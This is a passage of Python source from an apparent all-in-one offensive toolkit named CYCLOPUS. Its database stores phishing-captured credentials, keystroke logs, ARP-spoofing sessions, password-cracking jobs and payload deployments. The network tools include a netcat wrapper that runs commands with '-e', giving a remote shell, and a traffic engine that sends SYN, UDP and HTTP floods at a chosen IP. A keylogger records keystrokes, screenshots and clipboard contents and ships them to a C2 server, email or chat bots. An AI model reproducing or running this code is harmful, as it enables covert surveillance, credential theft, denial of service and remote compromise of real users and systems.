            stats['total_docker_scans'] = self.conn.execute("SELECT COUNT(*) FROM docker_scans").fetchone()[0]
            stats['total_cracking_jobs'] = self.conn.execute("SELECT COUNT(*) FROM cracking_jobs").fetchone()[0]
            stats['total_arp_spoofs'] = self.conn.execute("SELECT COUNT(*) FROM arp_spoofing").fetchone()[0]
            stats['total_mac_entries'] = self.conn.execute("SELECT COUNT(*) FROM mac_info").fetchone()[0]
            stats['total_nat_entries'] = self.conn.execute("SELECT COUNT(*) FROM nat_info").fetchone()[0]
            stats['total_emails'] = self.conn.execute("SELECT COUNT(*) FROM email_messages").fetchone()[0]
            stats['total_pdf_reports'] = self.conn.execute("SELECT COUNT(*) FROM pdf_reports").fetchone()[0]
        except:
            pass
        return stats
    
    def get_ssh_connections(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM ssh_connections ORDER BY name")
            return [dict(row) for row in rows]
        except:
            return []
    
    def add_ssh_connection(self, conn: SSHConnection) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO ssh_connections 
                   (id, name, host, port, username, password_encrypted, key_path, status, created_at)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (conn.id, conn.name, conn.host, conn.port, conn.username,
                 conn.password, conn.key_path, conn.status, conn.created_at)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to add SSH connection: {e}")
            return False
    
    def log_ssh_command(self, connection_id: str, command: str, output: str,
                       exit_code: int, execution_time: float):
        try:
            self.conn.execute(
                """INSERT INTO ssh_commands 
                   (connection_id, command, output, exit_code, execution_time)
                   VALUES (?, ?, ?, ?, ?)""",
                (connection_id, command, output[:5000], exit_code, execution_time)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log SSH command: {e}")
    
    def log_traffic(self, generator: TrafficGenerator, executed_by: str = "system"):
        try:
            self.conn.execute(
                """INSERT INTO traffic_logs 
                   (traffic_type, target_ip, target_port, duration, packets_sent, bytes_sent, status, executed_by)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                (generator.traffic_type, generator.target_ip, generator.target_port,
                 generator.duration, generator.packets_sent, generator.bytes_sent,
                 generator.status, executed_by)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log traffic: {e}")
    
    def save_keylog(self, text: str, window: str = "", process: str = "", screenshot_path: str = ""):
        try:
            self.conn.execute(
                "INSERT INTO keylogs (text, window, process, screenshot_path) VALUES (?, ?, ?, ?)",
                (text[:5000], window[:100], process[:100], screenshot_path)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save keylog: {e}")
    
    def get_keylogs(self, limit: int = 100) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM keylogs ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_captured_credential(self, link_id: str, username: str, password: str,
                                 ip_address: str, user_agent: str):
        try:
            self.conn.execute(
                """INSERT INTO captured_credentials (phishing_link_id, username, password, ip_address, user_agent)
                   VALUES (?, ?, ?, ?, ?)""",
                (link_id, username, password, ip_address, user_agent)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save credential: {e}")
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        try:
            if link_id:
                rows = self.conn.execute(
                    "SELECT * FROM captured_credentials WHERE phishing_link_id = ? ORDER BY timestamp DESC",
                    (link_id,)
                )
            else:
                rows = self.conn.execute("SELECT * FROM captured_credentials ORDER BY timestamp DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_deployment(self, deployment: Deployment) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO deployments 
                   (id, name, type, payload, target, created_at, delivered, opened, executed)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (deployment.id, deployment.name, deployment.type, deployment.payload,
                 deployment.target, deployment.created_at, deployment.delivered,
                 deployment.opened, deployment.executed)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save deployment: {e}")
            return False
    
    def get_deployments(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM deployments ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_docker_scan(self, image: str, vulnerabilities: List[Dict], severity: str,
                        scan_time: float, success: bool):
        try:
            self.conn.execute(
                """INSERT INTO docker_scans (image, vulnerabilities, severity, scan_time, success)
                   VALUES (?, ?, ?, ?, ?)""",
                (image, json.dumps(vulnerabilities), severity, scan_time, success)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save Docker scan: {e}")
    
    def save_cracking_job(self, job_id: str, hash_type: str, hash_value: str, wordlist: str) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO cracking_jobs (job_id, hash_type, hash_value, wordlist, status)
                   VALUES (?, ?, ?, ?, 'pending')""",
                (job_id, hash_type, hash_value, wordlist)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save cracking job: {e}")
            return False
    
    def update_cracking_job(self, job_id: str, status: str, result: str = None, cracked: bool = False):
        try:
            self.conn.execute(
                """UPDATE cracking_jobs 
                   SET status = ?, result = ?, cracked = ?, completed_at = CURRENT_TIMESTAMP 
                   WHERE job_id = ?""",
                (status, result, cracked, job_id)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to update cracking job: {e}")
    
    def get_cracking_jobs(self, status: str = None) -> List[Dict]:
        try:
            if status:
                rows = self.conn.execute("SELECT * FROM cracking_jobs WHERE status = ? ORDER BY started_at DESC", (status,))
            else:
                rows = self.conn.execute("SELECT * FROM cracking_jobs ORDER BY started_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def add_arp_spoof(self, target_ip: str, gateway_ip: str, interface: str) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO arp_spoofing 
                   (target_ip, gateway_ip, interface, started_at, status)
                   VALUES (?, ?, ?, CURRENT_TIMESTAMP, 'active')""",
                (target_ip, gateway_ip, interface)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def update_arp_spoof(self, target_ip: str, gateway_ip: str, packets_sent: int,
                         duration: float, ended_at: str) -> bool:
        try:
            self.conn.execute(
                """UPDATE arp_spoofing 
                   SET packets_sent = ?, duration = ?, ended_at = ?, status = 'completed'
                   WHERE target_ip = ? AND gateway_ip = ?""",
                (packets_sent, duration, ended_at, target_ip, gateway_ip)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_arp_spoofs(self, status: str = None) -> List[Dict]:
        try:
            if status:
                rows = self.conn.execute(
                    "SELECT * FROM arp_spoofing WHERE status = ? ORDER BY started_at DESC",
                    (status,)
                )
            else:
                rows = self.conn.execute("SELECT * FROM arp_spoofing ORDER BY started_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def add_mac_info(self, mac_address: str, vendor: str = None, ip_address: str = None,
                    hostname: str = None) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO mac_info 
                   (mac_address, vendor, ip_address, hostname, last_seen)
                   VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)""",
                (mac_address, vendor, ip_address, hostname)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to add MAC info: {e}")
            return False
    
    def add_nat_info(self, public_ip: str, private_ip: str, router_ip: str,
                    country: str, isp: str, nat_type: str) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO nat_info 
                   (public_ip, private_ip, router_ip, country, isp, nat_type)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (public_ip, private_ip, router_ip, country, isp, nat_type)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def save_email(self, email_msg: EmailMessage) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO email_messages 
                   (to_address, subject, body, from_address, html, attachments, status, sent_at)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                (email_msg.to, email_msg.subject, email_msg.body, email_msg.from_email,
                 1 if email_msg.html else 0, json.dumps(email_msg.attachments),
                 email_msg.status, email_msg.sent_at)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save email: {e}")
            return False
    
    def get_emails(self, status: str = None, limit: int = 50) -> List[Dict]:
        try:
            if status:
                rows = self.conn.execute(
                    "SELECT * FROM email_messages WHERE status = ? ORDER BY created_at DESC LIMIT ?",
                    (status, limit)
                )
            else:
                rows = self.conn.execute(
                    "SELECT * FROM email_messages ORDER BY created_at DESC LIMIT ?",
                    (limit,)
                )
            emails = []
            for row in rows:
                email = dict(row)
                email['attachments'] = json.loads(email['attachments']) if email['attachments'] else []
                emails.append(email)
            return emails
        except Exception as e:
            print(f"Failed to get emails: {e}")
            return []
    
    def save_pdf_report(self, report: PDFReport) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO pdf_reports 
                   (title, target, analysis, file_path, status)
                   VALUES (?, ?, ?, ?, ?)""",
                (report.title, report.target, json.dumps(report.analysis),
                 report.file_path, report.status)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save PDF report: {e}")
            return False
    
    def get_pdf_reports(self, limit: int = 20) -> List[Dict]:
        try:
            rows = self.conn.execute(
                "SELECT * FROM pdf_reports ORDER BY created_at DESC LIMIT ?",
                (limit,)
            )
            reports = []
            for row in rows:
                report = dict(row)
                report['analysis'] = json.loads(report['analysis']) if report['analysis'] else {}
                reports.append(report)
            return reports
        except Exception as e:
            print(f"Failed to get PDF reports: {e}")
            return []
    
    def save_network_packet(self, source_ip: str, dest_ip: str, source_port: int,
                           dest_port: int, protocol: str, size: int, payload: str = ""):
        try:
            self.conn.execute(
                """INSERT INTO network_packets 
                   (source_ip, dest_ip, source_port, dest_port, protocol, size, payload)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (source_ip, dest_ip, source_port, dest_port, protocol, size, payload[:1000])
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save network packet: {e}")
    
    def get_network_packets(self, limit: int = 100) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM network_packets ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_clipboard(self, content: str, source: str = "system"):
        try:
            self.conn.execute(
                "INSERT INTO clipboard_history (content, source) VALUES (?, ?)",
                (content[:5000], source)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save clipboard: {e}")
    
    def get_clipboard_history(self, limit: int = 50) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM clipboard_history ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def close(self):
        try:
            self.conn.close()
        except:
            pass

# =====================
# NETWORK TOOLS
# =====================
class NetworkTools:
    @staticmethod
    def ping(target: str, count: int = 4) -> CommandResult:
        start_time = time.time()
        try:
            if platform.system().lower() == 'windows':
                cmd = ['ping', '-n', str(count), target]
            else:
                cmd = ['ping', '-c', str(count), target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def nmap(target: str, scan_type: str = "quick") -> CommandResult:
        start_time = time.time()
        try:
            if scan_type == "quick":
                cmd = ['nmap', '-T4', '-F', target]
            elif scan_type == "full":
                cmd = ['nmap', '-p-', target]
            elif scan_type == "service":
                cmd = ['nmap', '-sV', target]
            elif scan_type == "os":
                cmd = ['nmap', '-O', target]
            else:
                cmd = ['nmap', target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def wget(url: str, output: str = None) -> CommandResult:
        start_time = time.time()
        try:
            cmd = ['wget', '-q', url]
            if output:
                cmd.extend(['-O', output])
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def curl(url: str, method: str = "GET", data: str = None) -> CommandResult:
        start_time = time.time()
        try:
            if method.upper() == "GET":
                cmd = ['curl', '-s', url]
            elif method.upper() == "POST":
                cmd = ['curl', '-s', '-X', 'POST', '-d', data or '', url]
            else:
                cmd = ['curl', '-s', '-X', method, url]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def netcat(host: str, port: int, command: str = None) -> CommandResult:
        start_time = time.time()
        try:
            if shutil.which('nc'):
                if command:
                    cmd = ['nc', host, str(port), '-e', command]
                else:
                    cmd = ['nc', '-zv', host, str(port)]
            elif shutil.which('ncat'):
                if command:
                    cmd = ['ncat', host, str(port), '-e', command]
                else:
                    cmd = ['ncat', '-zv', host, str(port)]
            else:
                return CommandResult(False, "Netcat not found", 0, "nc/ncat not installed")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def traceroute(target: str) -> CommandResult:
        start_time = time.time()
        try:
            if platform.system().lower() == 'windows':
                cmd = ['tracert', '-d', target]
            else:
                if shutil.which('mtr'):
                    cmd = ['mtr', '--report', '--report-cycles', '1', target]
                else:
                    cmd = ['traceroute', '-n', target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def whois(domain: str) -> CommandResult:
        start_time = time.time()
        try:
            if WHOIS_AVAILABLE:
                result = whois.whois(domain)
                execution_time = time.time() - start_time
                return CommandResult(True, str(result), execution_time)
            else:
                cmd = ['whois', domain]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                execution_time = time.time() - start_time
                return CommandResult(result.returncode == 0, result.stdout + result.stderr, execution_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def dns(domain: str, record_type: str = "A") -> CommandResult:
        start_time = time.time()
        try:
            if shutil.which('dig'):
                cmd = ['dig', domain, record_type, '+short']
            else:
                cmd = ['nslookup', domain]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def location(ip: str) -> Dict:
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'success': True,
                        'country': data.get('country'),
                        'city': data.get('city'),
                        'isp': data.get('isp'),
                        'lat': data.get('lat'),
                        'lon': data.get('lon')
                    }
            return {'success': False}
        except:
            return {'success': False}
    
    @staticmethod
    def get_local_ip() -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def block_ip(ip: str) -> bool:
        try:
            if platform.system().lower() == 'linux' and shutil.which('iptables'):
                subprocess.run(['sudo', 'iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'],
                             capture_output=True, timeout=10)
                return True
            elif platform.system().lower() == 'windows' and shutil.which('netsh'):
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'add', 'rule',
                               f'name=CYCLOPUS_Block_{ip}', 'dir=in', 'action=block',
                               f'remoteip={ip}'], capture_output=True, timeout=10)
                return True
            return False
        except:
            return False
    
    @staticmethod
    def unblock_ip(ip: str) -> bool:
        try:
            if platform.system().lower() == 'linux' and shutil.which('iptables'):
                subprocess.run(['sudo', 'iptables', '-D', 'INPUT', '-s', ip, '-j', 'DROP'],
                             capture_output=True, timeout=10)
                return True
            elif platform.system().lower() == 'windows' and shutil.which('netsh'):
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'delete', 'rule',
                               f'name=CYCLOPUS_Block_{ip}'], capture_output=True, timeout=10)
                return True
            return False
        except:
            return False
    
    @staticmethod
    def get_mac_vendor(mac: str) -> Optional[str]:
        try:
            mac = mac.upper().replace('-', ':').replace('.', ':')
            response = requests.get(f"https://api.macvendors.com/{mac}", timeout=5)
            if response.status_code == 200:
                return response.text.strip()
        except:
            pass
        return None

# =====================
# SSH MANAGER
# =====================
class SSHManager:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.connections: Dict[str, paramiko.SSHClient] = {}
    
    def is_available(self) -> bool:
        return PARAMIKO_AVAILABLE
    
    def add_connection(self, name: str, host: str, username: str,
                      password: str = None, key_path: str = None,
                      port: int = 22) -> SSHConnection:
        conn_id = str(uuid.uuid4())[:8]
        conn = SSHConnection(
            id=conn_id,
            name=name,
            host=host,
            port=port,
            username=username,
            password=password,
            key_path=key_path,
            created_at=datetime.datetime.now().isoformat()
        )
        self.db.add_ssh_connection(conn)
        return conn
    
    def connect(self, conn_id: str) -> bool:
        if not self.is_available():
            return False
        
        rows = self.db.get_ssh_connections()
        conn_data = next((c for c in rows if c['id'] == conn_id), None)
        if not conn_data:
            return False
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            connect_kwargs = {
                'hostname': conn_data['host'],
                'port': conn_data['port'],
                'username': conn_data['username'],
                'timeout': 30
            }
            
            if conn_data['password_encrypted']:
                connect_kwargs['password'] = conn_data['password_encrypted']
            elif conn_data['key_path'] and os.path.exists(conn_data['key_path']):
                connect_kwargs['key_filename'] = conn_data['key_path']
            
            client.connect(**connect_kwargs)
            self.connections[conn_id] = client
            
            self.db.conn.execute(
                "UPDATE ssh_connections SET status = 'connected', last_used = CURRENT_TIMESTAMP WHERE id = ?",
                (conn_id,)
            )
            self.db.conn.commit()
            return True
        except Exception as e:
            print(f"SSH connection error: {e}")
            return False
    
    def disconnect(self, conn_id: str):
        if conn_id in self.connections:
            try:
                self.connections[conn_id].close()
                del self.connections[conn_id]
            except:
                pass
        
        self.db.conn.execute(
            "UPDATE ssh_connections SET status = 'disconnected' WHERE id = ?",
            (conn_id,)
        )
        self.db.conn.commit()
    
    def execute_command(self, conn_id: str, command: str, timeout: int = 30) -> CommandResult:
        start_time = time.time()
        
        if conn_id not in self.connections:
            if not self.connect(conn_id):
                return CommandResult(False, "", 0, "Not connected")
        
        client = self.connections[conn_id]
        
        try:
            stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            exit_code = stdout.channel.recv_exit_status()
            
            execution_time = time.time() - start_time
            
            self.db.log_ssh_command(conn_id, command, output, exit_code, execution_time)
            
            return CommandResult(
                success=exit_code == 0,
                output=output + ("\n" + error if error else ""),
                execution_time=execution_time,
                error=None if exit_code == 0 else error
            )
        except Exception as e:
            execution_time = time.time() - start_time
            return CommandResult(False, "", execution_time, str(e))
    
    def get_connections(self) -> List[Dict]:
        rows = self.db.get_ssh_connections()
        for row in rows:
            row['connected'] = row['id'] in self.connections
        return rows

# =====================
# TRAFFIC GENERATOR ENGINE
# =====================
class TrafficGeneratorEngine:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.active_generators: Dict[str, TrafficGenerator] = {}
        self.stop_events: Dict[str, threading.Event] = {}
    
    def get_available_types(self) -> List[str]:
        types = [t.value for t in TrafficType]
        return types
    
    def generate(self, traffic_type: str, target_ip: str, duration: int,
                port: int = None, packet_rate: int = 100) -> TrafficGenerator:
        try:
            ipaddress.ip_address(target_ip)
        except:
            raise ValueError(f"Invalid IP: {target_ip}")
        
        if port is None:
            port_map = {
                'http_get': 80, 'http_post': 80, 'https': 443,
                'dns': 53, 'tcp_syn': 80, 'tcp_connect': 80, 'udp': 53
            }
            port = port_map.get(traffic_type, 0)
        
        generator_id = f"{target_ip}_{traffic_type}_{int(time.time())}"
        
        generator = TrafficGenerator(
            id=generator_id,
            traffic_type=traffic_type,
            target_ip=target_ip,
            target_port=port,
            duration=duration,
            start_time=datetime.datetime.now().isoformat(),
            status="running"
        )
        
        stop_event = threading.Event()
        self.stop_events[generator_id] = stop_event
        
        thread = threading.Thread(
            target=self._run_generator,
            args=(generator, packet_rate, stop_event),
            daemon=True
        )
        thread.start()
        
        self.active_generators[generator_id] = generator
        return generator
    
    def _run_generator(self, generator: TrafficGenerator, packet_rate: int,
                      stop_event: threading.Event):
        start_time = time.time()
        end_time = start_time + generator.duration
        packets_sent = 0
        bytes_sent = 0
        interval = 1.0 / max(1, packet_rate)
        
        func = self._get_generator_func(generator.traffic_type)
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                size = func(generator.target_ip, generator.target_port)
                if size > 0:
                    packets_sent += 1
                    bytes_sent += size
                time.sleep(interval)
            except Exception as e:
                time.sleep(0.1)
        
        generator.packets_sent = packets_sent
        generator.bytes_sent = bytes_sent
        generator.end_time = datetime.datetime.now().isoformat()
        generator.status = "completed" if not stop_event.is_set() else "stopped"
        
        self.db.log_traffic(generator)
    
    def _get_generator_func(self, traffic_type: str):
        funcs = {
            'icmp': self._icmp,
            'tcp_syn': self._tcp_syn,
            'tcp_ack': self._tcp_ack,
            'tcp_connect': self._tcp_connect,
            'udp': self._udp,
            'http_get': self._http_get,
            'http_post': self._http_post,
            'https': self._https,
            'dns': self._dns,
            'arp': self._arp,
            'mixed': self._mixed,
            'random': self._random
        }
        return funcs.get(traffic_type, self._icmp)
    
    def _icmp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/ICMP()
                send(packet, verbose=False)
                return len(packet)
            else:
                subprocess.run(['ping', '-c', '1', '-W', '1', target],
                              capture_output=True, timeout=2)
                return 64
        except:
            return 0
    
    def _tcp_syn(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="S")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_ack(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="A")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_connect(self, target: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((target, port))
            sock.close()
            return 40 if result == 0 else 0
        except:
            return 0
    
    def _udp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/UDP(dport=port)/b"CYCLOPUS"
                send(packet, verbose=False)
                return len(packet)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(b"CYCLOPUS", (target, port))
                sock.close()
                return 64
        except:
            return 0
    
    def _http_get(self, target: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=2)
            conn.request("GET", "/", headers={"User-Agent": "MysteriousCyclopus"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _http_post(self, target: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=2)
            conn.request("POST", "/", body="test=data",
                        headers={"User-Agent": "MysteriousCyclopus"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _https(self, target: str, port: int) -> int:
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(target, port, context=context, timeout=3)
            conn.request("GET", "/", headers={"User-Agent": "MysteriousCyclopus"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 200
        except:
            return 0
    
    def _dns(self, target: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            tid = random.randint(0, 65535).to_bytes(2, 'big')
            flags = b'\x01\x00'
            questions = b'\x00\x01'
            query = b'\x06google\x03com\x00\x00\x01\x00\x01'
            packet = tid + flags + questions + b'\x00\x00\x00\x00\x00\x00' + query
            sock.sendto(packet, (target, port))
            sock.close()
            return len(packet)
        except:
            return 0
    
    def _arp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                local_mac = self._get_local_mac()
                packet = Ether(src=local_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target)
                sendp(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _mixed(self, target: str, port: int) -> int:
        funcs = [self._icmp, self._tcp_syn, self._udp, self._http_get]
        return random.choice(funcs)(target, port)
    
    def _random(self, target: str, port: int) -> int:
        types = ['icmp', 'tcp_syn', 'udp', 'http_get', 'dns']
        return self._get_generator_func(random.choice(types))(target, port)
    
    def _get_local_mac(self) -> str:
        try:
            import uuid
            mac = uuid.getnode()
            return ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
        except:
            return "00:11:22:33:44:55"
    
    def stop(self, generator_id: str = None) -> bool:
        if generator_id:
            if generator_id in self.stop_events:
                self.stop_events[generator_id].set()
                return True
        else:
            for event in self.stop_events.values():
                event.set()
            return True
        return False
    
    def get_active(self) -> List[Dict]:
        return [
            {
                'id': g.id,
                'traffic_type': g.traffic_type,
                'target_ip': g.target_ip,
                'duration': g.duration,
                'packets_sent': g.packets_sent,
                'status': g.status
            }
            for g in self.active_generators.values()
        ]

# =====================
# KEYLOGGER ENGINE
# =====================
class KeyloggerEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running = False
        self.listener = None
        self.text = ""
        self.current_window = ""
        self.current_process = ""
        self.log_file = config.get('keylogger.log_file', KEYLOG_FILE)
        self.c2_server = config.get('keylogger.c2_server', "")
        self.upload_interval = config.get('keylogger.upload_interval', 30)
        self.screenshot_interval = config.get('keylogger.screenshot_interval', 60)
        self.capture_clipboard = config.get('keylogger.capture_clipboard', True)
        self.upload_timer = None
        self.screenshot_timer = None
        self.clipboard_timer = None
        self.last_clipboard = ""
        self.exfil_methods = config.get('keylogger.exfil_methods', ["file", "email", "c2"])
        self.telegram_bot = None
        self.discord_bot = None
    
    def start(self):
        if not PYNPUT_AVAILABLE:
            print(f"{Colors.ERROR}❌ Pynput not available. Install with: pip install pynput{Colors.RESET}")
            return False
        
        if self.running:
            return True
        
        try:
            self.running = True
            self.text = ""
            
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            
            self.upload_timer = threading.Timer(self.upload_interval, self._upload_keylog)
            self.upload_timer.daemon = True
            self.upload_timer.start()
            
            if self.screenshot_interval > 0:
                self.screenshot_timer = threading.Timer(self.screenshot_interval, self._take_screenshot)
                self.screenshot_timer.daemon = True
                self.screenshot_timer.start()
            
            if self.capture_clipboard:
                self.clipboard_timer = threading.Timer(5, self._monitor_clipboard)
                self.clipboard_timer.daemon = True
                self.clipboard_timer.start()
            
            print(f"{Colors.SUCCESS}✅ Advanced Keylogger started{Colors.RESET}")
            print(f"{Colors.SECONDARY}  • Press {self.config.get('keylogger.hotkey', 'F10')} to stop{Colors.RESET}")
            print(f"{Colors.SECONDARY}  • Screenshot interval: {self.screenshot_interval}s{Colors.RESET}")
            print(f"{Colors.SECONDARY}  • Upload interval: {self.upload_interval}s{Colors.RESET}")
            return True
        except Exception as e:
            print(f"{Colors.ERROR}❌ Failed to start keylogger: {e}{Colors.RESET}")
            return False
    
    def stop(self):
        self.running = False
        
        if self.listener:
            self.listener.stop()
            self.listener = None
        
        for timer in [self.upload_timer, self.screenshot_timer, self.clipboard_timer]:
            if timer:
                try:
                    timer.cancel()
                except:
                    pass
        
        self._save_keylog()
        print(f"{Colors.SUCCESS}✅ Keylogger stopped{Colors.RESET}")
    
    def on_press(self, key):
        try:
            if key == keyboard.Key.f10:
                self.stop()
                return False
            
            if key == keyboard.Key.enter:
                self.text += "\n"
            elif key == keyboard.Key.tab:
                self.text += "\t"
            elif key == keyboard.Key.space:
                self.text += " "
            elif key == keyboard.Key.backspace and len(self.text) > 0:
                self.text = self.text[:-1]
            elif hasattr(key, 'char') and key.char is not None:
                self._update_window_info()
                self.text += key.char
            
            if len(self.text) > 10000:
                self._save_keylog()
                self.text = ""
                
        except Exception as e:
            logger.error(f"Keylogger error: {e}")
    
    def _update_window_info(self):
        try:
            import pygetwindow as gw
            active = gw.getActiveWindow()
            if active:
                self.current_window = active.title
                self.current_process = active.title[:100]
        except:
            pass
    
    def _save_keylog(self):
        if self.text:
            timestamp = datetime.datetime.now().isoformat()
            screenshot_path = ""
            
            if self.screenshot_interval > 0:
                screenshot_path = self._take_screenshot()
            
            self.db.save_keylog(self.text, self.current_window, self.current_process, screenshot_path)
            
            with open(self.log_file, 'a') as f:
                f.write(f"\n[{timestamp}] [{self.current_window}]\n{self.text}\n")
            
            self._exfiltrate_data(self.text, screenshot_path)
            
